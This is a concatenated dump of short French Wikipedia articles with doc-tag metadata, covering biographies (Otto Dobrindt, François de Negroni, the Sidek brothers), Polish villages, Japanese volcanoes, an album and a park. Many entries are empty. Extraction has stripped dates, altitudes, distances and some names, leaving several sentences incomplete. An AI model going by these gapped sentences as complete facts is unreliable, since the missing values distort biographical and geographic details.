Johannes Willms a passé sa jeunesse à Karlsruhe. Son père Günther Willms était juge à la cour fédérale de justice à Karlsruhe. Après son Abitur au , il a étudié la philologie classique, l’histoire, l’histoire de l'art et la science politique à Vienne, à Séville et à l'université de Heidelberg. En 1975, il a passé son doctorat à Heidelberg auprès de Reinhart Koselleck. Ensuite, il a travaillé comme journaliste, d'abord pour la radio hessoise ("Hessischer Rundfunk"), après 1978 pour "ZDF" où de 1988 à 1992, il a dirigé le magazine "" et a conçu l'émission télévisée "Das Literarische Quartett". Par la suite, il a été de 1993 jusqu'à 2000, directeur littéraire de la "Süddeutsche Zeitung" avant de rejoindre Paris en tant que correspondant en France. En 2008, il a reçu le prix de l'Académie de Berlin.
À côté de son travail journalistique, Willms a fait paraître plusieurs publications historiques scientifiquement étayées qui s'adressent, par leur contenu et par leur style, à un large public. C’est l'histoire de la France qui est le sujet principal de son travail.

</doc>
<doc id="8979028" url="https://fr.wikipedia.org/wiki?curid=8979028" title="Jindřich Rezek">
Jindřich Rezek

Jindřich Rezek, né le et mort le , est un footballeur international bohémien, évoluant au poste de milieu de terrain.
Biographie.
Joueur de l'AC Sparta Prague, Jindřich Rezek honore deux sélections avec l'équipe nationale bohémo-morave. Il est le tout premier buteur de l'histoire de la sélection, lors du match contre la Hongrie en 1903.

</doc>
<doc id="8979030" url="https://fr.wikipedia.org/wiki?curid=8979030" title="Otto Dobrindt">
Otto Dobrindt

Otto Dobrindt né le à Henkendorf (Prusse-Occidentale), aujourd'hui Hanki (en Pologne) et mort à Berlin le , est un chef d'orchestre, arrangeur de musique légère et compositeur de musique de film allemand.
Biographie.
Dobrindt a commencé comme gérant des différentes labels de disques du groupe AG (Odeon, Parlophone et Beka), dont il était le directeur en chef. À partir de 1925, il prend sous divers pseudonymes (notamment "saxophone orchestre Dobbri, Odeon Dance Orchestra, Wiener Bohème Orchestra, Dobbri, Robert Renard, Eddie saxonne, Frank Sandler, Eric Harden, Götz Höhne, Horst Platen") ses propres productions dans différents styles qui vont du swing à la musique légère classique. L’"Orchestre Otto Dobrindt" a accompagné de nombreuses stars de cinéma de la firme UFA par des enregistrements de disques ; par exemple, Lilian Harvey (1931–1932), Willy Fritsch et Hans Albers. Dobrindt a réalisé l'enregistrement de pots-pourris de "La Veuve Joyeuse" avec la chanteuse et actrice suédoise Zarah Leander (1907–1981), également vedette de la UFA, la soprano (1928), le ténor Joseph Schmidt (1932)...
Après le départ du chef et violoniste Dajos Béla en 1933, il reprend la direction du "Wiener Boheme-Orchester" qui enregistrait aussi sous étiquette Odeon.
En 1935 il reprend la gestion de l'animation de l’"Orchestre Otto Dobrindt" sur , l'une des premières radios allemandes. La même année, il a écrit la musique pour le film « "Alles hört auf mein Kommando" » (avec Marianne Hoppe, Adele Sandrock, Gustav Püttjer). Il a dirigé de nombreux concerts en arborant, au revers de sa veste, le badge du NSDAP.
À partir de 1945, Dobrindt, abandonnant ses pseudonymes, se consacre uniquement à la musique classique à partir de 1955. Il dirige l'orchestre de divertissement de la Berliner Rundfunk, dans le secteur oriental de la ville. Dobrindt a également dirigé d'autres orchestres dans la RDA. Après 1961, il prend la responsabilité du département opérettes de l'orchestre symphonique de la radio de Leipzig et travaille avec l'Orchestre symphonique de la DEFA, ensemble de la firme de production cinématographique, créé au début des années 1950 en RDA ("Rauschende Melodien", 1955, musique de Johann Strauß).
Malgré son passé, .
Enregistrements.
À quoi s'ajoutent de nombreuses pièces en récital avec des chanteurs des années 1930 à 1960 ; par exemple le ténor Charles Kullman (1931, un air des "Contes d’Hoffmann" d'Offenbach, deux mélodies du "Das lied der liebe", de J. Strauss-Korngold : "Die eine Frau" et "Du bist mein Traum" chez Nimbus) ou le baryton Karl Schmitt-Walter (ca. 1960, Wagner, Verdi chez Berlin Classics).

</doc>
<doc id="8979036" url="https://fr.wikipedia.org/wiki?curid=8979036" title="Exupéry">
Exupéry



</doc>
<doc id="8979041" url="https://fr.wikipedia.org/wiki?curid=8979041" title="Seth (région)">
Seth (région)



</doc>
<doc id="8979043" url="https://fr.wikipedia.org/wiki?curid=8979043" title="Championnats d'Europe des régions de karaté 2016">
Championnats d'Europe des régions de karaté 2016



</doc>
<doc id="8979047" url="https://fr.wikipedia.org/wiki?curid=8979047" title="Serket (région)">
Serket (région)



</doc>
<doc id="8979049" url="https://fr.wikipedia.org/wiki?curid=8979049" title="Pedro Olea">
Pedro Olea

Pedro Olea, né à Bilbao (Espagne) le , est un réalisateur et scénariste espagnol, aussi producteur de cinéma.
Son film "Akelarre" (1984) a été présenté au Festival international du film de Berlin.

</doc>
<doc id="8979052" url="https://fr.wikipedia.org/wiki?curid=8979052" title="Cornouailles Soundtrack">
Cornouailles Soundtrack

Cornouailles Soundtrack est le vingtième album studio de Dan Ar Braz, sorti le 27 mars 2015 chez Coop Breizh. 
Dan Ar Braz reprend sa guitare et sa voix pour continuer à créer et aussi à revisiter des compositions au "cabaret" de sa Cornouaille, toile de fond de toute sa vie. La palette sonore choisie, plus acoustique, est propre à l'intimité et à la confidence. Les compositions sont dédiées principalement à son fils Tristan, mais aussi une à sa fille Youna, à son parrain, un traditionnel à Alan Stivell...
Conception.
Dan Ar Braz a conçu un album qui s'inscrit en continuité et en conclusion de ses trois précédents albums instrumentaux : "Musique pour les silences à venir..." (1984), "Septembre bleu" (1988) et "La mémoire des volets blancs" (2000). Ses deux principales influences guitaristiques restent Hank Marvin (un petit "delay" donne l'impression que sa guitare vient de l'horizon) et Pat Metheny (il parvient à s'exprimer en très peu de notes).
Après avoir mis un « s » à Bretagne ("Ici, ailleurs, là-bas") et Finistère ("Finisterres"), il évoque une Cornouaille plurielle, ce qui veut dire que chacun peut avoir son idéal propre. Sa guitare chante breton et, en fonction des couleurs choisies, peint un univers différent. L'habillage des notes de guitare par des musiciens bretons est au service des couleurs d’ici et de maintenant. Et puis des mots, des chansons, comme autant d’hommages à ces artistes ou groupes qui auront “habité” son adolescence mais restant toujours d’actualité dans la "bande son du monde" d'aujourd'hui (Beatles, Dylan…).
Il est enregistré en Bretagne par Patrick Péron. , écrit Dan Ar Braz dans le livret, en légende d'une photo où il pose devant une fresque de mots réalisée par son fils, disparu le 10 mars 2013 à l'âge de 33 ans.
Promotion.
En direct sur les chaînes locales bretonnes, il interprète en avant-première "Theme for a Victory", l'hymne de la soirée des Victoires de la Bretagne, organisée par Le Télégramme le 9 décembre 2014 à Brest Arena. En direct sur France 3 Bretagne, il interprète, accompagné de Jacques Pellen, "Moon River" et "Flakes of Peace", lors de l'émission "Bali Breizh" le 15 mars. L'album arrive à la deuxième place du Grand prix du disque du Télégramme.
Le nouveau répertoire est présenté lors d'un spectacle agrémenté de différents titres écrits tout au long de ses 45 ans de carrière. Les principaux concerts ont lieu dans le Finistère pour commencer (Brest, Plabennec, Quimper).
Un clip est tourné en août 2015 par Hervé Penhoat pour le titre "Wood on the sand". En septembre 2016, il réalise un second clip pour le titre "Avec le temps""."

</doc>
<doc id="8979053" url="https://fr.wikipedia.org/wiki?curid=8979053" title="Lands of Lore III">
Lands of Lore III



</doc>
<doc id="8979054" url="https://fr.wikipedia.org/wiki?curid=8979054" title="Razif Sidek">
Razif Sidek

Razif Sidek est un joueur de badminton malaisien né le .
Aux Jeux olympiques de 1992 à Barcelone, il est médaillé de bronze en double avec son frère Jalani Sidek.
Il a aussi un autre frère Rashid qui a été médaillé olympique de badminton.

</doc>
<doc id="8979055" url="https://fr.wikipedia.org/wiki?curid=8979055" title="Lysimacheia">
Lysimacheia



</doc>
<doc id="8979059" url="https://fr.wikipedia.org/wiki?curid=8979059" title="Sportinė Aviacija LAK-19">
Sportinė Aviacija LAK-19

Le planeur monoplace LAK-19 est de conception lituanienne, et fabriqué par Sportinė Aviacija.
Conception et développement.
Il a été conçu en prenant en compte la JAR-22. Il a une voilure en position médiane, et une profondeur en T et un train d'atterrissage escamotable. Les extensions d'ailes extérieures permettent de passer de 15 mètres à 18 mètres avec et sans winglets.
La construction utilise du kevlar, de la fibre de carbone et de la résine. 
Une demi voilure pèse 55 kg et son longeron est fabriqué en fibre de carbone. La voilure est équipée d'aérofrein sur l'extrados et peut emporter 180 kg d'eau.
Toutes les commandes venant de la voilures sont à branchement automatique.
Le LAK-19 est basé sur le LAK-17, mais pas équipé de volet de courbure. Il effectua son premier vol le et certifié le .

</doc>
<doc id="8979060" url="https://fr.wikipedia.org/wiki?curid=8979060" title="Championnats d'Europe des régions de karaté 2017">
Championnats d'Europe des régions de karaté 2017



</doc>
<doc id="8979062" url="https://fr.wikipedia.org/wiki?curid=8979062" title="Mont Nyū">
Mont Nyū

Le est un stratovolcan du Groupe volcanique septentrional de Yatsugatake situé à Koumi dans la préfecture de Nagano au Japon. Cette montagne fait partie du parc quasi national de Yatsugatake-Chūshin Kōgen.

</doc>
<doc id="8979070" url="https://fr.wikipedia.org/wiki?curid=8979070" title="Rashid Sidek">
Rashid Sidek

Rashid Sidek est un joueur de badminton malaisien né le .
Après une élimination en quarts de finale aux Jeux olympiques d'été de 1992 à Barcelone, il est médaillé de bronze en simple aux Jeux olympiques d'été de 1996 à Atlanta.
Deux de ses frères sont aussi médaillés olympiques, Jalani et Razif Sidek.

</doc>
<doc id="8979071" url="https://fr.wikipedia.org/wiki?curid=8979071" title="Nout (région)">
Nout (région)



</doc>
<doc id="8979072" url="https://fr.wikipedia.org/wiki?curid=8979072" title="Parc de Kit Carson à Escondido">
Parc de Kit Carson à Escondido

Le Parc de Kit Carson à Escondido est un parc de loisirs, et un parc de sculptures. Créé en 1967 à Escondido, (Californie), en hommage à Kit Carson, un des héros de la Conquête de l'Ouest. Ce parc de ville, dont une partie est consacrée à la préservation de la nature, comporte de nombreux espaces de jeux ou de sport. Il a été choisi par Niki de Saint Phalle pour construire un ensemble de sculptures monumentales offertes à la ville : Queen Califia's Magical Circle. Il existe également un "Kit Carson Park" à Taos : le "Kit Carson Memorial State Park" que l'on envisage de renommer pour ne pas le confondre avec celui-ci .
Le héros fondateur.
Kit Carson est considéré par George Fronval comme un « ami des indiens » Acoma parmi lesquels il a vécu avant de servir dans l'armée. Au lieu de vivre à Santa Fe, il s'était installé à Taos, village proche d'Escondido où il partageait la vie des indiens. Sa tombe se trouve non loin du "Parc de Kit Carson à Escondido" dans le cimetière de Taos. Bien qu'ayant participé aux guerres indiennes en particulier, sur ordre et apparemment à regret, à la guerre contre le peuple Navajo, il reste, selon la notule de l'historien Michel Mourre, une des figures les plus populaires du Far West.
La dernière héroïne.
Peu de temps avant sa mort, Niki de Saint Phalle a entrepris un parc de sculpture monumentales qui n'a été achevé qu'après sa mort et ouvert au public le : Queen Califia's Magical Circle. L'artiste a été inspirée par les arts amérindiens comme le montrent les totems, mais aussi l'aigle que chevauche la reine Califia est, chez les indiens, le symbole du courage. Le serpent qui entoure les sculptures est aussi un symbole amérindien de l'énergie vitale. C'est aussi un hommage à la Californie et à sa fondatrice Califia, reine à peau noire. L'artiste a été inspirée par le livre du géologue John McPhee, et son ouvrage "Assembling California" qui explique comment la collision de plusieurs plaques tectoniques ont créé la Californie.
Description du parc.
Selon le site officiel, Le "Parc de Kit carson à Escondido" (Kit Carson Park en anglais) possède trois lacs, des panneaux solaires , des courts de tennis, un terrain de baseball, un de football, un de softball, un amphithéâtre d'un contenance de 3000 places, un centre de sports, un terrain de golf. Il offre encore une quantité d'autres possibilités de loisirs .

</doc>
<doc id="8979075" url="https://fr.wikipedia.org/wiki?curid=8979075" title="Championnats d'Europe des régions de karaté">
Championnats d'Europe des régions de karaté

Les championnats d'Europe des régions de karaté sont une compétition sportive de karaté ayant lieu chaque année en Europe depuis 2003. Ils sont organisés par la Fédération européenne de karaté.

</doc>
<doc id="8979076" url="https://fr.wikipedia.org/wiki?curid=8979076" title="Mafdet (région)">
Mafdet (région)



</doc>
<doc id="8979077" url="https://fr.wikipedia.org/wiki?curid=8979077" title="Judaël">
Judaël

Judaël ou Judhaël est roi de Domnomée armoricaine vers les années 580 à 605.
Biographie.
Contexte.
Chronologiquement le règne de Judaël correspond à la fondation de l'évêché d'Aleth par Maclou et aux incursions des Bretons de Waroch et de son fils Canao II dans les territoires des cités de Rennes et Nantes, incursions auxquelles il a peut-être participé. 
Origine.
Judaël est le fils ainé et successeur vers 580 de Judual. Son nom est tiré de deux racines communes en brittonique, "Iud" (combat) et "Hael" (bon). On ignore tout de son règne ; la "vita Judicaelis" composée par le moine de Saint-Méen Igomar n'évoque que les circonstances merveilleuses de sa rencontre avec sa future épouse.
Les noces de Pritelle.
Dans les dernières années de la vie de son père, le jeune Judaël chasse dans la forêt qui s'étendait de Plounéour-Trez à Plouescat, dans une région détachée du pays de Léon (latin : ') et nommé (en latin ' c'est-à-dire le territoire confié à Ili), qui était dirigée par un certain Ausoch, "comte" de Léon ("in capite littoris magni") et siégeant vraisemblablement à Tréflez. Judaël, fatigué par sa chasse, s'endort et fait un songe dans lequel il voit une merveilleuse jeune fille en laquelle il reconnait Pritelle ou Prizell, la fille d'Ausoch, qui lui présente un poteau orné de symboles chrétiens. La jeune femme, que l'on peut rapprocher historiquement de la princesse Azénor, fille du comte de Léon Even ou Neven, au destin semblable, porte un nom brittonique latinisé ("Pritella"), hypocoristique de "Pryd", "jolie" ; son nom se retrouve au pays de Galles comme synonyme d'Hélène, épouse de Macsen Wledig.
À son réveil, Judaël prend le conseil du légendaire poète Taliesin qui se trouvait à Rhuys, auprès de Gildas le Sage ; le barde lui confirme que le songe signifiait qu'il devait épouser Prizel et lui faire un enfant destiné au service de Dieu. Le jeune prince épousa donc Prizel avec l'accord de ses parents, événement narré de diverses façons dans les manuscrits de la "vita", qui mettent en scène tantôt la vision du mariage au , tantôt celle du XVe : les versions tardives mettent en effet l'accent sur la bénédiction parentale, quand les versions les plus anciennes décrivent une union rapide et cavalière, rapide dans l'exercice de la volonté divine, plus proche du concubinage que d'un réel mariage ("duxit eam in pelicatum" [...] "trahens in thalamum eam cognovit").
Pritelle enfanta de lui une vaste descendance composée de quinze fils, dont le premier-né est Judicaël, et de cinq filles . La mort de Pritelle et le remariage de Judaël n'est pas explicitement mentionnée ("obituaire de Saint-Méen"), mais engendre de nouvelles péripéties pour l'aîné de la fratrie qui pourraient être liées à la naissance miraculeuse de Budoc de Dol dans le Munster. Sa mort vers 605 ouvre une sanglante succession.

</doc>
<doc id="8979081" url="https://fr.wikipedia.org/wiki?curid=8979081" title="Maât (région)">
Maât (région)



</doc>
<doc id="8979082" url="https://fr.wikipedia.org/wiki?curid=8979082" title="Pirates - Kat la Rouge">
Pirates - Kat la Rouge



</doc>
<doc id="8979086" url="https://fr.wikipedia.org/wiki?curid=8979086" title="Hatméhyt (région)">
Hatméhyt (région)



</doc>
<doc id="8979087" url="https://fr.wikipedia.org/wiki?curid=8979087" title="Bernhard Keller (mathématicien)">
Bernhard Keller (mathématicien)

Bernhard Keller est un mathématicien suisse né en 1962, spécialisé en algèbre. Il est professeur à l’Institut de mathématiques Jussieu-Paris Rive Gauche à l’université Paris-Diderot.
Biographie.
Keller est diplômé en 1990 sous la direction de Pierre Gabriel à l'université de Zurich avec ses travaux sur les catégories dérivées.
Travaux.
Il consacre ses recherches aux , à la théorie des catégories, à l'étude des carquois en théorie des représentations, aux variétés de Calabi-Yau et aux catégories dérivées.
En 1991, Keller introduit les tours de catégories triangulées.
En 2013, il lui est octroyé un doctorat " de l'université d'Anvers.
En 2014, il est lauréat du prix Sophie-Germain.
Il est conférencier invité au Congrès international des mathématiciens à Madrid en 2006, avec une intervention intitulée ".

</doc>
<doc id="8979088" url="https://fr.wikipedia.org/wiki?curid=8979088" title="François de Negroni">
François de Negroni

François de Negroni, né le , essayiste et polémiste. Il est originaire de Rogliano, dans le Cap Corse (France).
Biographie.
Famille.
Il descend en ligne directe d'une famille de feudataires du nord Cap Corse (Seigneurie de San Colombano) dont la présence à Rogliano remonte au et qui est étroitement mêlée à l'histoire politique et militaire de l'île. Une grande partie de ses aïeux, suivant l'exemple de nombreux Capcorsins, a émigré à Puerto Rico, durant la première moitié du . Le célèbre chanteur Ricky Martin (fils de Henrique Martin Negroni) est issu de cette branche familiale.
Il est le frère de la philosophe Barbara de Negroni et sa belle-soeur était l'avocate Isabelle Coutant-Peyre.
Afin d'éclaircir sa relation épistémologique au monde social, il a interrogé ces déterminants familiaux dans son essai "La France noble", occasion d'un passage à l'émission "Apostrophes"."M. de Negroni aurait fait un parfait Saint-Just !", commentera Jacques Buisson, tandis que François d'Orcival écrira : "M. François de Negroni ne revendique que les titres de "Corse, marxiste et sociologue". C'est ainsi qu'il s'est présenté, en chemise déboutonnée et costume de velours, le 10 octobre, à l'émission télévisée "Apostrophes".
"Enseignement".
François de Negroni a enseigné les sciences humaines et l’anthropologie dans plusieurs universités africaines, ainsi qu’en France et en Belgique. Il a également travaillé comme consultant, sur les problèmes d'éducation, dans les pays du Sahel. C'est au cours de l'une de ces missions que le sociologue mauritanien Cheikh Saad Bouh Kamara lui a collé son surnom: "le grand nègre" ("negroni" littéralement). Un surnom repris, par amitié, dans l'intitulé d'un restaurant au Sénégal.
À ce sujet, il a soutenu dans diverses publications que le bannissement lexical du mot nègre, au prétexte de ses connotations outrageantes, était l'oeuvre du pouvoir blanc, afin de déposséder le monde noir, afrodescendants ultramarins et immigrés subsahariens, d'un vocable jadis porteur de fierté, de dignité, d'émancipation, sous les plumes de Senghor, Césaire, Fanon, etc., et indissociable des combats culturels et politiques indépendantistes
En 1972, alors assistant à l'Université de Madagascar, il crée un lien amical et intellectuel avec Thomas Sankara, le futur président du Burkina Faso, élève-officier à l'Académie Militaire d'Antsirabe. Il a raconté la naissance de cette relation dans "Une nuit à Majunga", et dédié à la mémoire du leader révolutionnaire burkinabé, assassiné en 1987, son ouvrage "Afrique fantasmes."
Ce dernier livre, salué comme "un bain de jouvence pour l'esprit" par le magazine Jeune Afrique a été classé par Alain Mabanckou, dans sa Leçon Inaugurale au Collège de France, en 2016, parmi les quarante références nécessaires à une appréhension pertinente de l'univers subsaharien. À travers ce texte, François de Negroni souligne le paradoxe des représentations occidentales de l'Afrique noire, immuables par-delà les âges et les renouvellements du champ lexical, et toujours fondées sur une approche raciste dualiste qui s'articule autour de l'opposition mythique des figures du bon et du mauvais sauvage. Il a utilisé la même grille d'analyse, appliquée à la perception des Corses par les Français continentaux, dans sa "Petite anthologie du racisme pro-corse."
Édition.
Il est fondateur et codirecteur avec François Coupry et Jean-Edern Hallier des éditions du même nom en 1976 (devenues les éditions Libres Hallier en 1978) . Il crée en 1997 la collection Les Pourfendeurs au Castor astral, où il réédite notamment le livre de Stanislas Adotevi, "Négritude et Négrologues." En 2004, il fonde les éditions Materia Scritta, à Bastia, où sont publiés des écrivains corses contemporains : Marc Biancarelli, Robert Colonna d'Istria, Dominique Memmi, Marie-Jean Vinciguerra, Gilles Zerlini; ainsi que des auteurs africains comme Théophile Kouamouo ou Samira Fall.
Son pamphlet sur les coopérants français dans le tiers-monde, "Les Colonies de" "vacances", a été dénoncé par des journalistes Africains et Européens. A sa sortie, en 1977, ce livre fit scandale dans les sphères de la Françafrique, assorti de menaces de mort envers l'auteur. "Un coup bas porté à la politique de coopération", selon Robert Galley, le ministre de tutelle, tandis que son prédécesseur au même poste, le gaulliste Raymond Triboulet, ira jusqu'à écrire :"Je viens de lire les pitreries de François de Negroni sur les coopérants. Malheureusement, nous n'avons pu toujours faire de bons choix en matière de coopération, ainsi celui de Negroni qui n'y a rien compris et se contente de brocarder ses anciens collègues à la lumière de ses propres instincts : prétention, amour du gain ... et de la fesse." 
Il avait en effet, à cette occasion, introduit la notion de "sexpatriation", pour décrire les pratiques néocoloniales prédatrices des coopérants, et il récidivera plus tard dans son essai "Old is Beautiful," rédigé en Thaïlande, dans lequel il analyse le tourisme sexuel de masse comme le défoulement exotique revanchard des classes occidentales dominées, au sein d'un univers capitaliste où les élites bourgeoises ont fait de l'émancipation des mœurs et des rituels érotiques permissifs leur domaine privé. Il y parle aussi de "barbarie à visage humanitaire" pour qualifier le travail des ONG en général, et précisément sur le terrain de la prostitution locale.
Affaires judiciaires et politiques.
Il est incarcéré et expulsé de Yougoslavie en compagnie de Jean-Edern Hallier en 1977 , expulsé aussi de Centrafrique, en 1979, avec le journaliste Jonathan Mongory, les deux étant soupçonnés d'enquêter sur l'« affaire des diamants » visant Valéry Giscard d'Estaing, puis mis sur écoutes téléphoniques par la cellule de l’Élysée sous la présidence de François Mitterrand.
Dans son ouvrage sur l'intelligentsia française ("Le Savoir-vivre intellectuel)," à l'aune précisément de ces expériences, il formalisera les stratégies culturo-mondaines à l’œuvre en ce milieu. Un livre salué, à sa sortie, par l'élite médiatique de la critique littéraire : Jean-Paul Enthoven, Bertrand Poirot-Delpech, Angelo Rinaldi.
Recherches.
Sociologue, disciple d'Henri Lefebvre qui fut son directeur de thèse (sociologie - Paris Nanterre, 1977), proche ami de Michel Clouscard (auquel il a consacré un livre) et de Dominique Pagani, il prolonge, dans ses travaux, les principes d'une critique marxiste des superstructures et de la vie quotidienne, s'attachant à approfondir les notions de « fausse conscience », de « violence symbolique », d'« imaginaire collectif ». Ses différents écrits procèdent d'une même approche incisive des micro-sociétés, groupes statutaires et autres fractions de classe. L'occasion de dévoiler les articulations entre les discours, leurs impensés, leur complémentarité dialectique et les stratégies de domination.
La mise en perspective sociologique, dont il critique d'ailleurs le néo-positivisme, voire la dimension contre-révolutionnaire, n'est pour lui qu'un moyen au service de ce projet. .
Il s'est aussi intéressé à l'Histoire, notamment en participant à des travaux collectifs sur la participation des Corses à la colonisation française ou à travers la traduction et la publication critique d'une longue lettre inédite adressée à Pascal Paoli par le fils présumé du roi Théodore de Neuhoff, Frédéric.
Publications.
Collaborations.
Il a également publié plus de cinquante articles dans divers journaux, revues et magazines (traditionnels ou numériques), tels "20 ans", "L'Idiot international", "L'Eventail", "Le Mois en Afrique", "Afrique Asie", "Kyrn", "Fabula", "Marianne", 20 Minutes, "Le Gri-Gri international", "L'Affranchi". Un grand nombre de ces articles ont été réunis dans les volumes "Incoercible", "Incoercible II" et "Incoercible III;"

</doc>
<doc id="8979090" url="https://fr.wikipedia.org/wiki?curid=8979090" title="Imhotep (région)">
Imhotep (région)



</doc>
<doc id="8979091" url="https://fr.wikipedia.org/wiki?curid=8979091" title="Hathor (région)">
Hathor (région)



</doc>
<doc id="8979093" url="https://fr.wikipedia.org/wiki?curid=8979093" title="Khépri (région)">
Khépri (région)



</doc>
<doc id="8979096" url="https://fr.wikipedia.org/wiki?curid=8979096" title="Mont Tengu">
Mont Tengu

Le est un stratovolcan culminant à d'altitude à la limite de Chino et Koumi dans la préfecture de Nagano au Japon. Cette montagne est la plus élevée du groupe volcanique septentrional de Yatsugatake. Le mont Tengu fait partie du parc quasi national de Yatsugatake-Chūshin Kōgen.

</doc>
<doc id="8979099" url="https://fr.wikipedia.org/wiki?curid=8979099" title="Liste de points extrêmes de la Moldavie">
Liste de points extrêmes de la Moldavie

La liste des points extrêmes de la Moldavie, qui possède de frontières dont avec la Roumanie et de avec l'Ukraine, est exposée ici.

</doc>
<doc id="8979105" url="https://fr.wikipedia.org/wiki?curid=8979105" title="Fécondation externe">
Fécondation externe

La fécondation externe est un mode de reproduction sexuée où les gamètes mâles et femelle (spermatozoïdes et l'ovule) se reproduisent le plus souvent dans un milieu aquatique dans lequel se produit la fécondation et le développement de l'embryon. Le processus de fécondation externe peut également être appelé frai. Ces œufs ont une coquille qui les protège de l'extérieur, mais qui peut être facilement pénétrée par le sperme.

</doc>
<doc id="8979110" url="https://fr.wikipedia.org/wiki?curid=8979110" title="Aqueduc de l'Agua de Prata">
Aqueduc de l'Agua de Prata

L'aqueduc de l'Agua de Prata (en portugais : Aqueduto da Água de Prata, ou Aqueduto da Água da Prata, ou Aqueduto da Prata : littéralement « aqueduc des Eaux d'Argent ») est un complexe d'installations hydrauliques ayant pour but d'alimenter en eau la ville d'Évora, au Portugal. 
Inauguré en 1537, il fut construit sous le règne de Jean III par l'architecte du roi Francisco de Arruda.
L'aqueduc transporte l'eau des sources de Graça do Divor sur une distance d'environ 18 km jusqu'à Évora. Il est un des rares aqueducs de cette époque à être encore en fonction, contribuant à l'alimentation en eau de la ville.

</doc>
<doc id="8979112" url="https://fr.wikipedia.org/wiki?curid=8979112" title="Greg Shapiro">
Greg Shapiro

Greg Shapiro, de son vrai nom Gregory Brian Shapiro, est un producteur de cinéma américain né le à Los Angeles (Californie).
Biographie.
Au cours de sa troisième année à l'UCLA, Greg Shapiro décide d'abandonner l'université pour devenir l'assistant de Nick Nolte, ils produiront ensemble "Simpatico" et "Investigating Sex" en 2001. Son premier film en solo sera "Les Lois de l'attraction".

</doc>
<doc id="8979118" url="https://fr.wikipedia.org/wiki?curid=8979118" title="Janiszew (Mazovie)">
Janiszew (Mazovie)

Janiszew (prononciation : ) est un village polonais de la "gmina" de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979121" url="https://fr.wikipedia.org/wiki?curid=8979121" title="Fédération costaricienne d'athlétisme">
Fédération costaricienne d'athlétisme

La Fédération costaricienne d'athlétisme (en espagnol, Federación Costarricense de Atletismo, FECOA) est la fédération d'athlétisme du Costa Rica, fondée en 1960. Elle siège à San José. Elle fait partie de l'Association d'athlétisme d'Amérique du Nord, d'Amérique centrale et des Caraïbes (NACAC) et de l'Association internationale des fédérations d'athlétisme (IAAF).

</doc>
<doc id="8979122" url="https://fr.wikipedia.org/wiki?curid=8979122" title="Janiszew">
Janiszew

En Pologne, Janiszew peut désigner :

</doc>
<doc id="8979123" url="https://fr.wikipedia.org/wiki?curid=8979123" title="Facteur de Croissance Transformant">
Facteur de Croissance Transformant



</doc>
<doc id="8979124" url="https://fr.wikipedia.org/wiki?curid=8979124" title="Championnats NACAC d'athlétisme 2015">
Championnats NACAC d'athlétisme 2015



</doc>
<doc id="8979127" url="https://fr.wikipedia.org/wiki?curid=8979127" title="Jaszowice (Mazovie)">
Jaszowice (Mazovie)

Jaszowice (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979128" url="https://fr.wikipedia.org/wiki?curid=8979128" title="Magid Mohamed">
Magid Mohamed

Magid Mohamed Hassan () (né le à Khartoum au Soudan) est un joueur de football international qatarien d'origine soudanaise, qui évolue au poste d'attaquant.
Biographie.
Carrière en sélection.
Avec l'équipe du Qatar, il joue 63 matchs (pour 10 buts inscrits) depuis 2003. 
Il figure dans le groupe des sélectionnés lors des coupes d'Asie des nations de 2004, de 2007 et de 2015.
Il joue également 14 matchs comptant pour les tours préliminaires de la coupe du monde, lors des éditions 2006, et .

</doc>
<doc id="8979129" url="https://fr.wikipedia.org/wiki?curid=8979129" title="Jaszowice">
Jaszowice

Jaszowice peut désigner :
Toponymie.
en Pologne

</doc>
<doc id="8979130" url="https://fr.wikipedia.org/wiki?curid=8979130" title="Aqueduc da Água de Prata">
Aqueduc da Água de Prata



</doc>
<doc id="8979133" url="https://fr.wikipedia.org/wiki?curid=8979133" title="Kozia Wola (Mazovie)">
Kozia Wola (Mazovie)

Kozia Wola (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ au nord-ouest de Zakrzew (siège de la gmina), au nord-ouest de Radom (siège de le powiat) et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979134" url="https://fr.wikipedia.org/wiki?curid=8979134" title="Offensive du sud du Yémen">
Offensive du sud du Yémen



</doc>
<doc id="8979136" url="https://fr.wikipedia.org/wiki?curid=8979136" title="Kozia Wola">
Kozia Wola

En Pologne, Kozia Wola peut désigner :

</doc>
<doc id="8979137" url="https://fr.wikipedia.org/wiki?curid=8979137" title="Kozinki">
Kozinki

Kozinki (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ à l'est de Zakrzew (siège de la "gmina"), au nord-ouest de Radom (siège du "powiat") et à au sud de Varsovie (capitale de la Pologne).
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979138" url="https://fr.wikipedia.org/wiki?curid=8979138" title="Mont Neishi">
Mont Neishi

Le est une montagne culminant à d'altitude à la limite des villes de Chino et Koumi dans la préfecture de Nagano au Japon. Cette montagne appartient au groupe volcanique septentrional de Yatsugatake.
Le mont Neishi est un stratovolcan inclus dans le parc quasi national de Yatsugatake-Chūshin Kōgen.

</doc>
<doc id="8979140" url="https://fr.wikipedia.org/wiki?curid=8979140" title="Legęzów">
Legęzów

Legęzów (prononciation : ) est un village polonais de la gmina de Zakrzew dans le powiat de Radom de la voïvodie de Mazovie dans le centre-est de la Pologne.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Radom.

</doc>
<doc id="8979143" url="https://fr.wikipedia.org/wiki?curid=8979143" title="OILB">
OILB



</doc>
<doc id="8979148" url="https://fr.wikipedia.org/wiki?curid=8979148" title="Ilerdien">
Ilerdien

L' est une subdivision de l'Éocène (deuxième époque de l'ère Cénozoïque) dans l'échelle des temps géologiques, plus ou moins équivalent au sous-étage de l'Yprésien inférieur — l'Yprésien supérieur correspondant au Cuisien. Il dure approximativement de . Il est à l'extrême pointe de la transgression marine.
C'est la toute première et plus ancienne division de l'époque Éocène.
Historique.
